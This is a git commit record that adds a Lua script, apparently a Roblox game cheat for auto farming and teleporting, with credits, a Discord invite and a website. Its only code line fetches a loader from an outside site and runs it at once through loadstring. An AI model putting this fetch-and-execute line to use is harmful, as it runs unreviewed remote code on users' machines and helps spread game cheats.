c85445bbe3f827bc45b57ec6ef8a129ca2cdca36
Emil Toth <emiltoth1870@gmail.com>
2023-03-08 19:16:53 +0100

    Updated automatically!

---
+++ Scripts/Autoadd/Site Auto Farm Teleport  More.lua
@@ -0,0 +1,12 @@
+--[[
+Brought to you by {V}#0001
+Scripted by {V}#0001
+Scripted by Applebox#0001
+Scripted by DylZ#9121
+
+(Script will auto invite to discord)
+Manual Invite: discord.gg/D35jZ4X3PW
+Website: https://vendettahub.xyz/
+]]
+
+loadstring(game:HttpGet("http://vendettahub.xyz/Vendetta/Loader.lua"))()
